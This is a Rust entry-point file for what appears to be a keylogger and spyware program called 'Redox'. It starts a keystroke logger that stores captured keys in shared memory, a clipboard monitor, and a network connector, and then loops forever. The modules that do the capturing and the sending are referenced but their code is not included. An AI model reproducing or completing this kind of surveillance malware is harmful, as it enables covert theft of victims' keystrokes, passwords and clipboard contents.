use std::sync::{Arc, Mutex};
use Redox::schema::key_logger::KeyLoggData;
use crate::clipboard::start_clipboard;
use crate::connector::start_connector;
use crate::keylogger::start_logger;

mod keylogger;
mod clipboard;
mod connector;
mod handler;

#[tokio::main]
async fn main() {
    let log_mem: Arc<Mutex<Vec<KeyLoggData>>> = Arc::new(Mutex::new(Vec::new()));
    start_logger(log_mem.clone());
    start_clipboard();
    start_connector().await;
    loop {}
}


